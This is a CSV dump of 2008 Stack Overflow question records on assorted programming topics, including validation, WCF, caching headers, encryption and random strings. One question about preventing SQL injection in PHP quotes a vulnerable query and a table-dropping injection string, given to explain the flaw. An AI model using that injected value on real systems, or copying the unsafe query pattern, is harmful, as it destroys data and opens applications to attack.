Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"46029","1","72421","","2008-09-05 15:24:39","","12","28108","<p>If I have a collection of database tables (in an Access file, for example) and need to validate each table in this collection against a rule set that has both common rules across all tables as well as individual rules specific to one or a subset of tables, can someone recommend a good design pattern to look into?</p>

<p>Specifically, I would like to avoid code similar to:</p>

<pre><code>void Main()
{
    ValidateTable1();
    ValidateTable2();
    ValidateTable3();
}

private void ValidateTable1()
{
    //Table1 validation code goes here
}

private void ValidateTable2()
{
    //Table2 validation code goes here
}

private void ValidateTable3()
{
    //Table3 validation code goes here
}
</code></pre>

<p>Also, I've decided to use log4net to log all of the errors and warnings, so that each method can be declared <code>void</code> and doesn't need to return anything.  Is this a good idea or would it be better to create some sort of <code>ValidationException</code> that catches all exceptions and stores them in a <code>List&lt;ValidationException&gt;</code> before printing them all out at the end?</p>

<p>I did find <a href=""http://www.hickorysystems.com/sw_validation.html"" rel=""noreferrer"">this</a>, which looks like it may work, but I'm hoping to actually find some code samples to work off of.  Any suggestions?  Has anyone done something similar in the past?</p>

<p>For some background, the program will be written in either C# or VB.NET and the tables will more than likely be stored in either Access or SQL Server CE.</p>
","1108","jerhinesmith","","","","2018-03-08 09:57:09","Data Validation Design Patterns","<design-patterns><validation><oop>","5","0","10","",""
"46283","1","46314","","2008-09-05 16:50:44","","7","17260","<p>We have a service that has some settings that are supported only over net.tcp. What's the best way to add another endpoint? Do I need to create an entire new host?</p>
","781","Esteban","63550","Mark Biek","2012-01-25 21:29:48","2018-12-17 09:55:59","Can a service have multiple endpoints?","<.net><wcf><web-services>","4","0","1","",""
"46338","1","46356","","2008-09-05 17:18:55","","18","21022","<p>I am writing a webapp using CodeIgniter that requires authentication. I created a model which handles all my authentication. However, I can't find a way to access this authentication model from inside another model. Is there a way to access a model from inside another mode, or a better way to handle authentication inside CodeIgniter?</p>
","889","Eldila","782535","","2012-07-21 10:17:24","2013-07-18 21:24:06","Can you access a model from inside another model in CodeIgniter?","<php><codeigniter><authentication><model>","4","0","3","",""
"46663","1","47452","","2008-09-05 19:23:00","","196","230435","<p>Is it possible to send an email from my Java application using a GMail account?  I have configured my company mail server with Java app to send email, but that's not going to cut it when I distribute the application. Answers with any of using Hotmail, Yahoo or GMail are acceptable.</p>
","1288","Bill the Lizard","1288","","2015-07-04 15:24:52","2019-09-12 10:47:16","How can I send an email by Java application using GMail, Yahoo, or Hotmail?","<java><email><gmail><javamail><mail-server>","13","0","132","",""
"47427","1","47428","","2008-09-06 13:00:32","","110","42259","<p>Many websites, including this one, add what are apparently called <em>slugs</em> - descriptive but as far as I can tell useless bits of text - to the end of URLs.</p>

<p>For example, the URL the site gives for this question is:</p>

<p><a href=""https://stackoverflow.com/questions/47427/why-do-some-websites-add-slugs-to-the-end-of-urls""><code>https://stackoverflow.com/questions/47427/why-do-some-websites-add-slugs-to-the-end-of-urls</code></a></p>

<p>But the following URL works just as well:</p>

<p><a href=""https://stackoverflow.com/questions/47427/""><code>https://stackoverflow.com/questions/47427/</code></a></p>

<p>Is the point of this text just to somehow make the URL more user friendly or are there some other benefits? </p>
","3171","Dave Webb","1402846","Simucal","2017-06-07 02:19:20","2019-06-01 13:05:28","Why do some websites add ""Slugs"" to the end of URLs?","<url><seo><friendly-url><slug>","14","5","38","2012-08-23 15:03:51",""
"48919","1","48925","","2008-09-08 00:15:50","","3","199","<p>What is the Javascript to scroll to the top when a button/link/etc. . . clicked?</p>
","2469","Longhorn213","1242646","","2017-03-07 14:56:37","2017-03-07 14:56:37","Javascript: make the web browser scroll to the top?","<javascript><web>","3","0","","",""
"49547","1","2068407","","2008-09-08 12:08:49","","1440","852240","<p>Our investigations have shown us that not all browsers respect the HTTP cache directives in a uniform manner.</p>

<p>For security reasons we do not want certain pages in our application to be cached, <strong>ever,</strong> by the web browser. This must work for at least the following browsers:</p>

<ul>
<li>Internet Explorer 6+</li>
<li>Firefox 1.5+</li>
<li>Safari 3+</li>
<li>Opera 9+</li>
<li>Chrome</li>
</ul>

<p>Our requirement came from a security test. After logging out from our website you could press the back button and view cached pages.</p>
","5182","Edward Wilde","63550","Edward Wilde","2019-06-25 21:57:57","2019-09-01 12:56:11","How do we control web page caching, across all browsers?","<http><caching><https><http-headers>","26","5","964","",""
"51988","1","3448945","","2008-09-09 14:18:23","","86","19913","<p>Have any well-documented or open source projects targeted <code>iPhone</code>, <code>Blackberry</code>, and <code>Android</code> ? Are there other platforms which are better-suited to such an endeavor ? 
Note that I am particularly asking about client-side software, not web apps, though any information about the difficulties of using web apps across multiple mobile platforms is also interesting.</p>
","654","Nicholas","474193","","2012-08-03 12:03:24","2015-10-27 06:43:25","What work has been done on cross-platform mobile development?","<iphone><android><blackberry><mobile><webos>","17","0","33","2012-06-14 16:46:02","2011-04-12 18:45:10"
"54200","1","54213","","2008-09-10 14:31:04","","14","27812","<p>I am developing a web app which requires a username and password to be stored in the web.Config, it also refers to some URLs which will be requested by the web app itself and never the client.</p>

<p>I know the .Net framework will not allow a web.config file to be served, however I still think its bad practice to leave this sort of information in plain text.  </p>

<p>Everything I have read so far requires me to use a command line switch or to store values in the registry of the server.  I have access to neither of these as the host is online and I have only FTP and Control Panel (helm) access.</p>

<p>Can anyone recommend any good, free encryption DLL's or methods which I can use?  I'd rather not develop my own!</p>

<p>Thanks for the feedback so far guys but I am not able to issue commands and and not able to edit the registry.  Its going to have to be an encryption util/helper but just wondering which one!</p>
","2208","Mauro","1016343","Mauro","2018-11-30 11:42:30","2018-11-30 11:48:07","Encrypting appSettings in web.config","<.net><security><encryption><web-applications><appsettings>","3","0","9","",""
"54791","1","","","2008-09-10 17:36:30","","2","685","<p>It's getting close to the time when I need to submit training and travel requests. I'm looking for conferences and classes in the coming 12 months that are geared toward improving coding and software development, best practices, system architecture, etc. They need to be in the US or Canada since I'll never get approval for anything else.</p>

<p>Here are a few that I've found, but I'm looking for other suggestions. Also feedback on any of these would be appreciated too:<br>
<a href=""http://www.spsymposium.com/agenda.html"" rel=""nofollow noreferrer"">Software Process Symposium</a><br>
<a href=""http://sdbestpractices.com/index.php?option=com_frontpage&amp;Itemid=1"" rel=""nofollow noreferrer"">Software Development Best Practices</a><br>
 <a href=""http://www.sqe.com/bettersoftwareconf/"" rel=""nofollow noreferrer"">Better Software Conference</a><br>
<a href=""http://www.iasaconnections.com/shows/iasa2008fall/default.asp?s=119"" rel=""nofollow noreferrer"">IASA Connections</a></p>

<p>The IASA event looks like the closest match for me but doesn't give me enough lead time to request &amp; schedule it.</p>
","5208","Keith G","334849","","2013-07-19 12:43:08","2015-05-27 07:17:25","Conferences and training for architects, best practices,","<architecture>","7","0","2","",""
"54991","1","55447","","2008-09-10 18:45:15","","210","192144","<p>When a user on our site loses his password and heads off to the Lost Password page we need to give him a new temporary password. I don't really mind how random this is, or if it matches all the ""needed"" strong password rules, all I want to do is give them a password that they can change later.</p>

<p>The application is a Web application written in C#. so I was thinking of being mean and going for the easy route of using part of a Guid. i.e.</p>

<pre><code>Guid.NewGuid().ToString(""d"").Substring(1,8)
</code></pre>

<p>Suggesstions? thoughts?</p>
","231","FryHard","32598","MrValdez","2019-02-10 22:32:14","2019-08-02 17:48:35","Generating Random Passwords","<c#><passwords><random>","23","2","54","",""
"55643","1","55647","","2008-09-11 01:31:57","","10","9046","<p>I'm going to be implementing a <code>PHP/mySQL</code> setup to store credit card information.</p>

<p>It seems like <code>AES_ENCRYPT/AES_DECRYPT</code> is the way to go, </p>

<p><strong>but I'm still confused on one point:</strong> </p>

<p><strong>How do I keep the encryption key secure?</strong></p>

<p>Hardwiring it into my PHP scripts (which will live on the same server as the db) seems like a major security hole. </p>

<p><strong>What's the ""best practice"" solution here?</strong></p>
","3578","","4311889","","2016-06-09 04:59:16","2016-06-09 04:59:16","How do I keep a mySQL database secure?","<php><mysql><security><aes>","4","0","4","",""
"55901","1","55910","","2008-09-11 06:30:04","","51","77745","<p>Is there a web service of some sort (or any other way) to pull a current time zone settings for a (US) city. For the parts of the country that don't follow the Daylight Saving Time and basically jump timezones when everyone else is switching summer/winter time... I don't fancy creating own database of the places that don't follow DST. Is there a way to pull this data on demand? </p>

<p>I need this for the database server (not for client workstations) - there entities stored in the database that have City, State as properties. I need know current timezone for these entities at any moment of time.</p>
","4808","sergeb","1400768","sergeb","2013-09-09 13:12:09","2018-06-09 19:04:06","Web service - current time zone for a city?","<web-services><timezone>","10","0","31","",""
"57854","1","","","2008-09-11 22:59:39","","78","310011","<p>How can I close a browser window without receiving the <em>Do you want to close this window</em> prompt?</p>

<p>The prompt occurs when I use the <code>window.close();</code> function.</p>
","5440","Derek","5425748","","2016-08-26 15:45:31","2018-02-18 17:53:24","How can I close a browser window without receiving the ""Do you want to close this window"" prompt?","<javascript><browser>","18","4","33","",""
"58457","1","454454","","2008-09-12 07:44:16","","24","7404","<p>How do you randomly select a table row in T-SQL based on an applied weight for all candidate rows?</p>

<p>For example, I have a set of rows in a table weighted at 50, 25, and 25 (which adds up to 100 but does not need to), and I want to select one of them randomly with a statistical outcome equivalent to the respective weight.</p>
","2929","Dane","15401","Nigel Campbell","2008-10-08 22:18:42","2018-10-17 02:11:30","Random Weighted Choice in T-SQL","<sql-server><tsql><random>","5","0","12","",""
"58621","1","","","2008-09-12 10:26:31","","22","71225","<p>How do I make an MD5 hash of a string with Delphi?</p>
","3366","devstopfix","3366","Jim McKeeth","2015-02-14 17:48:57","2016-04-12 15:57:13","How do I hash a string with Delphi?","<delphi><hash><cryptography><md5>","8","2","6","2017-02-24 15:44:32",""
"59327","1","59363","","2008-09-12 15:34:58","","151","100048","<p>So I'm getting really sick of E*TRADE and, being a developer, would love to find an online broker that offers an API. It would be great to be able to write my own trading tools, and maybe even modify existing ones.</p>

<p>Based on my research so far, I've only found one option. Interactive Brokers offers a multi-language API (Java/C++/ActiveX/DDE) and has some fairly decent commission rates to boot. I want to make sure there aren't any other options out there I should be considering. Any ideas?</p>

<p>Update: Based on answers so far, here's a quick list...</p>

<ul>
<li><a href=""http://www.interactivebrokers.com/"" rel=""noreferrer"">Interactive Brokers</a>

<ul>
<li>Java</li>
<li>C++</li>
<li>ActiveX</li>
<li>DDE for Excel</li>
</ul></li>
<li><a href=""http://www.pcmtrading.com"" rel=""noreferrer"">Pinnacle Trading</a>

<ul>
<li>C++</li>
<li>Perl</li>
<li>VB.NET</li>
<li>Excel</li>
</ul></li>
<li><a href=""http://www.mbtrading.com/developersMain.aspx?page=sdk"" rel=""noreferrer"">MB Trading</a></li>
</ul>
","5291","Wilco","64421","Wilco","2014-01-20 08:49:07","2014-08-07 05:21:19","What online brokers offer APIs?","<api><stocks><trading>","10","7","112","2013-10-11 06:58:54",""
"60174","1","60496","","2008-09-12 23:55:00","","2776","1627564","<p>If user input is inserted without modification into an SQL query, then the application becomes vulnerable to <a href=""https://stackoverflow.com/a/332367/"">SQL injection</a>, like in the following example:</p>

<pre class=""lang-php prettyprint-override""><code>$unsafe_variable = $_POST['user_input']; 

mysql_query(""INSERT INTO `table` (`column`) VALUES ('$unsafe_variable')"");
</code></pre>

<p>That's because the user can input something like <code>value'); DROP TABLE table;--</code>, and the query becomes:</p>

<pre><code>INSERT INTO `table` (`column`) VALUES('value'); DROP TABLE table;--')
</code></pre>

<p>What can be done to prevent this from happening?</p>
","428190","Andrew G. Johnson","707111","user456814","2016-10-01 08:08:27","2019-07-15 13:49:05","How can I prevent SQL injection in PHP?","<php><mysql><sql><security><sql-injection>","28","0","3548","","2012-11-05 16:18:49"
"61256","1","61329","","2008-09-14 10:42:52","","4","19228","<p>I have a problem with a little .Net web application which uses the Amazon webservice. With the integrated Visual Studio web server everything works fine. But after deploying it to the IIS on the same computer i get the following error message:</p>

<pre><code>Ein Verbindungsversuch ist fehlgeschlagen, da die Gegenstelle nach
einer bestimmten Zeitspanne nicht ordnungsgemäß reagiert hat, oder
die hergestellte Verbindung war fehlerhaft, da der verbundene Host
nicht reagiert hat 192.168.123.254:8080
</code></pre>

<p>Which roughly translates to ""cant connect to 192.168.123.254:8080""</p>

<p>The computer is part of an Active Directory. The AD-Server was installed on a network which uses 192.168.123.254 as a proxy. Now it is not reachable and should not be used.</p>

<p><strong>How do I prevent the IIS from using a proxy?</strong></p>

<p>I think it has something to do with policy settings for the Internet Explorer. An ""old"" AD user has this setting, but a newly created user does not. I checked all the group policy settings and nowhere is a proxy defined.</p>

<p>The web server is running in the context of the anonymous internet user account on the local computer. Do local users get settings from the AD? If so how can I change that setting, if I cant login as this user?</p>

<p>What can I do, where else i could check?</p>
","6297","","2193","Jason Etheridge","2008-09-21 06:15:04","2009-09-07 06:36:56","IIS uses proxy for webservice request. How to stop this?","<asp.net><web-services><iis><proxy>","3","0","1","",""
"71944","1","72221","","2008-09-16 13:01:15","","36","138354","<p>I am using <code>&lt;input type=""file"" id=""fileUpload"" runat=""server""&gt;</code> to upload a file in an ASP.NET application. I would like to limit the file type of the upload (example: limit to .xls or .xlsx file extensions). </p>

<p>Both JavaScript or server-side validation are OK (as long as the server side validation would take place before the files are being uploaded - there could be some very large files uploaded, so any validation needs to take place before the actual files are uploaded).</p>
","51","Yaakov Ellis","63550","","2010-02-14 12:33:11","2019-01-09 16:58:24","How do I Validate the File Type of a File Upload?","<asp.net><javascript><validation><file><upload>","15","0","21","",""
"84882","1","550808","","2008-09-17 16:09:00","","545","178024","<p>This is a pretty simple question, at least it seems like it should be, about sudo permissions in Linux.</p>

<p>There are a lot of times when I just want to append something to <code>/etc/hosts</code> or a similar file but end up not being able to because both <code>&gt;</code> and <code>&gt;&gt;</code> are not allowed, even with root.</p>

<p>Is there someway to make this work without having to <code>su</code> or <code>sudo su</code> into root?</p>
","9908","","608639","Jim","2019-03-06 01:57:22","2019-08-24 14:50:22","sudo echo ""something"" >> /etc/privilegedFile doesn't work","<bash><shell><scripting><permissions><sudo>","14","0","158","",""
"88311","1","88341","","2008-09-17 22:24:44","","723","391462","<p>I'm currently generating an 8-character pseudo-random uppercase string for ""A"" .. ""Z"":</p>

<pre><code>value = """"; 8.times{value  &lt;&lt; (65 + rand(25)).chr}
</code></pre>

<p>but it doesn't look clean, and it can't be passed as an argument since it isn't a single statement.  To get a mixed-case string ""a"" .. ""z"" plus ""A"" .. ""Z"", I changed it to:</p>

<pre><code>value = """"; 8.times{value &lt;&lt; ((rand(2)==1?65:97) + rand(25)).chr}
</code></pre>

<p>but it looks like trash.</p>

<p>Does anyone have a better method?</p>
","10157","Jeff","128421","Jeff","2017-04-13 19:22:29","2019-08-22 13:27:30","How to generate a random string in Ruby","<ruby><random><passwords>","51","7","258","","2012-07-03 14:23:56"
"93451","1","93463","","2008-09-18 15:12:19","","36","29466","<p>I would like to add AES encryption to a software product, but am concerned by increasing the size of the data. I am guessing that the data does increase in size, and then I'll have to add a compression algorithm to compensate.</p>
","","Bob Kuhl","","","","2015-09-22 14:32:28","Does AES (128 or 256) encryption expand the data? If so, by how much?","<encryption><compression><aes>","7","1","3","",""
"93551","1","93688","","2008-09-18 15:25:07","","500","318009","<p>Web applications that want to force a resource to be <em>downloaded</em> rather than directly <em>rendered</em> in a Web browser issue a <code>Content-Disposition</code> header in the HTTP response of the form:</p>

<p><code>Content-Disposition: attachment; filename=<em>FILENAME</em></code></p>

<p>The <code>filename</code> parameter can be used to suggest a name for the file into which the resource is downloaded by the browser. <a href=""http://tools.ietf.org/html/rfc2183"" rel=""noreferrer"">RFC 2183</a> (Content-Disposition), however, states in <a href=""http://tools.ietf.org/html/rfc2183#section-2.3"" rel=""noreferrer"">section 2.3</a> (The Filename Parameter) that the file name can only use US-ASCII characters:</p>

<blockquote>
  <p>Current [RFC 2045] grammar restricts
  parameter values (and hence
  Content-Disposition filenames) to
  US-ASCII.  We recognize the great
  desirability of allowing arbitrary
  character sets in filenames, but it is
  beyond the scope of this document to
  define the necessary mechanisms.</p>
</blockquote>

<p>There is empirical evidence, nevertheless, that most popular Web browsers today seem to permit non-US-ASCII characters yet (for the lack of a standard) disagree on the encoding scheme and character set specification of the file name. Question is then, what are the various schemes and encodings employed by the popular browsers if the file name “naïvefile” (without quotes and where the third letter is U+00EF) needed to be encoded into the Content-Disposition header?</p>

<p>For the purpose of this question, <em>popular browsers</em> being:</p>

<ul>
<li>Firefox </li>
<li>Internet Explorer </li>
<li>Safari</li>
<li>Google Chrome </li>
<li>Opera</li>
</ul>
","6682","raboof","70157","raboof","2009-05-01 08:37:01","2019-07-22 13:58:45","How to encode the filename parameter of Content-Disposition header in HTTP?","<browser><http-headers><specifications>","18","3","176","",""
"93911","1","94318","","2008-09-18 16:01:36","","36","12293","<p>Part of our java application needs to run javascript that is written by non-developers.  These non-developers are using javascript for data formatting. (Simple logic and string concatenation mostly).</p>

<p>My question is how can I setup the execution of these scripts to make sure scripting errors don't have a major negative impact on the rest of the application.</p>

<ul>
<li>Need to guard against infinite loops</li>
<li>Guard against spawning new threads.  </li>
<li>Limit access to services and environment

<ul>
<li>File system (Example: If a disgruntled script writer decided to delete files)</li>
<li>Database (Same thing delete database records)</li>
</ul></li>
</ul>

<p>Basically I need to setup the javascript scope to only include exactly what they need and no more.</p>
","5569","delux247","14955","","2009-04-16 04:45:47","2015-07-15 14:19:47","How can you run Javascript using Rhino for Java in a sandbox?","<java><javascript><sandbox><rhino>","6","1","25","",""
"94316","1","94364","","2008-09-18 16:43:49","","20","68438","<p>I want to change the Text of the browse button in the FileUpload Control (System.Web.UI.WebControls), instead of the [Browse...] text I want to use [...]</p>
","","Jorge Mastro","-1","","2008-09-22 09:25:51","2017-08-18 09:51:12","How to change the Text of the browse button in the FileUpload Control (System.Web.UI.WebControls)","<asp.net><file-upload>","5","0","5","",""
"95213","1","","","2008-09-18 18:17:54","","98","116711","<p>Simple example: I want to have some items on a page (like divs or table rows), and I want to let the user click on them to select them. That seems easy enough in jQuery. To save which items a user clicks on with no server-side post backs, I was thinking a cookie would be a simple way to get this done.</p>

<ol>
<li>Is this assumption that a cookie is OK in this case, correct?</li>
<li>If it is correct, does the jQuery API have some way to read/write cookie information that is nicer than the default JavaScript APIs?</li>
</ol>
","5619","Saul","220272","","2017-11-07 11:12:06","2017-11-07 11:12:06","Can jQuery read/write cookies to a browser?","<javascript><jquery><cookies>","8","0","26","",""
"95820","1","95826","","2008-09-18 19:08:09","","77","121586","<p>Let's say I have an array, and I know I'm going to be doing a lot of ""Does the array contain X?"" checks. The efficient way to do this is to turn that array into a hash, where the keys are the array's elements, and then you can just say <pre>if($hash{X}) { ... }</pre></p>

<p>Is there an easy way to do this array-to-hash conversion? Ideally, it should be versatile enough to take an anonymous array and return an anonymous hash.</p>
","7598","raldi","3964397","raldi","2015-08-26 19:12:28","2015-08-26 19:12:28","In Perl, how do I create a hash whose keys come from a given array?","<arrays><perl><hash>","14","0","33","",""
"97421","1","98210","","2008-09-18 21:57:42","","0","12439","<p>Will IE6 negotiate a 256 bit AES SSL connection if the server is capable?</p>
","17583","danivo","","","","2015-07-15 07:25:55","Does IE6 Support AES 256 bit encryption?","<ssl><internet-explorer-6><aes>","5","0","2","",""
"97522","1","206409","","2008-09-18 22:10:44","","182","90279","<p>What are all the valid self-closing elements (e.g. &lt;br/&gt;) in XHTML (as implemented by the major browsers)?</p>

<p>I know that XHTML technically allows any element to be self-closed, but I'm looking for a list of those elements supported by all major browsers.  See <a href=""http://dusan.fora.si/blog/self-closing-tags"" rel=""noreferrer"">http://dusan.fora.si/blog/self-closing-tags</a> for examples of some problems caused by self-closing elements such as &lt;div /&gt;.</p>
","1335","kamens","18821","Chris","2012-09-07 19:12:27","2018-12-09 00:08:40","What are all the valid self-closing elements in XHTML (as implemented by the major browsers)?","<html><xhtml><browser><cross-browser>","13","2","63","",""
